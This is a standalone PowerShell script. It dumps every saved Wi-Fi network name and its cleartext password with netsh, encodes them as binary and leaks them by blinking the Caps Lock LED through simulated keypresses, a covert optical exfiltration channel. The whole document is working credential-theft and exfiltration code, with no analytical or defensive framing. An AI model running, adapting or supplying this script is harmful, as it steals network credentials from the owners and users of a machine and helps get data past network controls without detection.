# All-in-One Script to Extract Wi-Fi Credentials and Blink LEDs via Simulated Keypress

# Function to extract Wi-Fi credentials
function Get-WifiCredentials {
    $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
        ($_ -split ":")[1].Trim()
    }

    $credentials = @()
    foreach ($profile in $profiles) {
        $details = netsh wlan show profile name="$profile" key=clear
        $password = ($details | Select-String "Key Content") -replace "Key Content\s+:\s+", ""
        $credentials += [PSCustomObject]@{
            SSID     = $profile
            Password = $password
        }
    }

    return $credentials
}

# Function to convert text to binary
function TextToBinary {
    param([string]$text)
    $binary = ""
    foreach ($char in $text.ToCharArray()) {
        $binary += "{0:08b}" -f [byte][char]$char
    }
    return $binary
}

# Function to simulate keypress for Caps Lock
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Keyboard {
    [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    public static extern short GetKeyState(int keyCode);

    [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    public static extern void keybd_event(byte virtualKey, byte scanCode, int flags, IntPtr extraInfo);

    public const int KEYEVENTF_EXTENDEDKEY = 0x1;
    public const int KEYEVENTF_KEYUP = 0x2;
    public const int VK_CAPITAL = 0x14;

    public static void ToggleCapsLock(bool state) {
        bool isCapsLockOn = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
        if (isCapsLockOn != state) {
            keybd_event((byte)VK_CAPITAL, 0x45, KEYEVENTF_EXTENDEDKEY, IntPtr.Zero);
            keybd_event((byte)VK_CAPITAL, 0x45, KEYEVENTF_KEYUP, IntPtr.Zero);
        }
    }
}
"@

function Blink-CapsLock {
    param([string]$binary)
    foreach ($bit in $binary.ToCharArray()) {
        if ($bit -eq "1") {
            [Keyboard]::ToggleCapsLock($true)  # Turn Caps Lock ON
        } else {
            [Keyboard]::ToggleCapsLock($false)  # Turn Caps Lock OFF
        }
        Start-Sleep -Milliseconds 500  # Adjust blinking speed
    }
    [Keyboard]::ToggleCapsLock($false)  # Ensure LED is OFF at the end
}

# Main script execution
Write-Host "Starting Wi-Fi credential extraction and LED blinking..."
$wifiCredentials = Get-WifiCredentials
foreach ($credential in $wifiCredentials) {
    $data = "SSID: $($credential.SSID), Password: $($credential.Password)"
    Write-Host "Encoding and blinking: $data"
    $binaryData = TextToBinary -text $data
    Blink-CapsLock -binary $binaryData
}
Write-Host "Done!"
